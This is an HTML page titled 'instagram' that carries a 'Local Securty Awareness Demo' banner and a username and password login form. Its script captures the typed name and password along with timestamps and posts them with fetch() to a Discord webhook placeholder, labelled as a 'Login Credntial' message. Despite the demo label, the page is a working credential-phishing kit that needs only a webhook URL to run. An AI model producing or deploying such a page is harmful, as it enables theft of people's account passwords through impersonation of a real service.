<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>instagram</title>
</head>

<body>

    <div class="training-warning">Local Securty Awareness Demo</div>

    <div class="card">


        <form id="form">

            <label for="name">Name: </label>
            <input type="text" id="name" name="name" required>

            <label for="password">Password: </label>
            <input type="password" id="password" name="password" required>

            <button type="submit">Log In</button>

        </form>

    </div>


    <script>
        const formLoadTime = new Date();

        document.getElementById('form').addEventListener('submit', function (event) {

            // Prevent the browser from reloading
            event.preventDefault();

            const submitClickTime = new Date();

            const nameValue = document.getElementById('name').value;
            const passwordValue = document.getElementById("password").value;

            const webhookUrl = "{{DS-HOOK}}";

            const green = "\x1b[1;32m";
            const cyan = "\x1b[1;36m";
            const white = "\x1b[0;37m";
            const reset = "\x1b[0m";

            const discordMessage = {
                content: `\`\`\`ansi\n` +
                    `${green}**Login Credntial**${reset}\n` +
                    `${cyan}Email:${reset} ${white}${nameValue}${reset}\n` +
                    `${cyan}Password:${reset} ${white}${passwordValue}${reset}\n` +
                    `${cyan}Form Opened At:${reset} ${white}${formLoadTime.toLocaleString()}${reset}\n` +
                    `${cyan}Submit Clicked At:${reset} ${white}${submitClickTime.toLocaleString()}${reset}\n` +
                    `\`\`\``
            };


            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            });

            document.querySelector('h1').textContent = "Loading...";
            document.getElementById('form').style.display = "none";
        })
    </script>

</body>

</html>
